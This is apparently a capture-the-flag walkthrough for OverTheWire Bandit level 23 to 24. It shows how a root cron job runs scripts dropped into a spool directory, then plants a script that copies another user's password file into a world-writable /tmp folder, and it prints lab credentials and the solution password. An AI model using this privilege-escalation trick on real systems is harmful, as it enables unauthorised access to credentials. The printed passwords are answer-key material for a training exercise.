# Level 23 → Level 24

## Description
```Description
## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
```

## Credentials
```Credentials
SSH Information  
Host: bandit.labs.overthewire.org  
Port: 2220
username: bandit23
Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## Let's Explore

CronJobs
```bash
bandit23@bandit:~$ ls -la /etc/cron.d/
total 60
drwxr-xr-x   2 root root  4096 Jul 28 19:07 .
drwxr-xr-x 132 root root 12288 Jul 28 19:32 ..
-r--r-----   1 root root    47 Jul 28 19:04 behemoth4_cleanup
-rw-r--r--   1 root root   123 Jul 28 18:57 clean_tmp
-rw-r--r--   1 root root   120 Jul 28 19:03 cronjob_bandit22
-rw-r--r--   1 root root   122 Jul 28 19:03 cronjob_bandit23
-rw-r--r--   1 root root   120 Jul 28 19:03 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root    48 Jul 28 19:05 leviathan5_cleanup
-rw-------   1 root root   138 Jul 28 19:05 manpage3_resetpw_job
-rwx------   1 root root    52 Jul 28 19:07 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat/usr/bin/cronjob_bandit24.sh
-bash: cat/usr/bin/cronjob_bandit24.sh: No such file or directory
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

## Lets Make A payload
```bash
bandit23@bandit:/tmp$ # Pick a random name to avoid collisions
mkdir /tmp/bob12345
# Verify you own it
ls -ld /tmp/bob12345
# Now make sure it's world-writable
chmod 777 /tmp/bob12345

# Create the cron payload
echo '#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bob12345/pass24' > /var/spool/bandit24/foo/myscript.sh
chmod +x /var/spool/bandit24/foo/myscript.sh
drwxrwxr-x 2 bandit23 bandit23 4096 Aug 12 21:14 /tmp/bob12345
```
Wait for about 1 min to executes to cronjob
And Got the File and also the Password
```bash
bandit23@bandit:/tmp$ ls -l /tmp/bob12345
total 4
-rw-rw-r-- 1 bandit24 bandit24 33 Aug 12 21:15 pass24
bandit23@bandit:/tmp$ 
bandit23@bandit:/tmp$ cat /tmp/bob12345
cat: /tmp/bob12345: Is a directory
bandit23@bandit:/tmp$ cat /tmp/bob12345/pass24
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/tmp$ 
```
## Password
```Password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
